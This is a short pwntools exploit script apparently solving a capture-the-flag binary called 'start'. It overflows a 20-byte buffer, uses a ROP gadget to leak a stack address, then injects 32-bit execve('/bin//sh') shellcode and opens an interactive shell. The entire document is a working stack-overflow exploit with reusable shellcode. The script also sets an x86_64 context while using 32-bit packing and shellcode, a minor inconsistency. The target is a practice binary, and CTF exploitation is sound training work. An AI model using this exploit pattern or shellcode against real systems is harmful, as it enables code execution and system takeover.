from pwn import *

context(terminal=['tmux', 'new-window'])

context(os = 'linux', arch = 'x86_64')


p = gdb.debug('./start')
rop_gadget = p32(0x08048087)

payload = 'A'*20 + rop_gadget


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvuntil("CTF:")

p.send(payload)

esp = u32(p.recv()[:4])


stack_inject = "A"*20 + p32(esp + 20) + shellcode

p.send(stack_inject)

p.interactive()
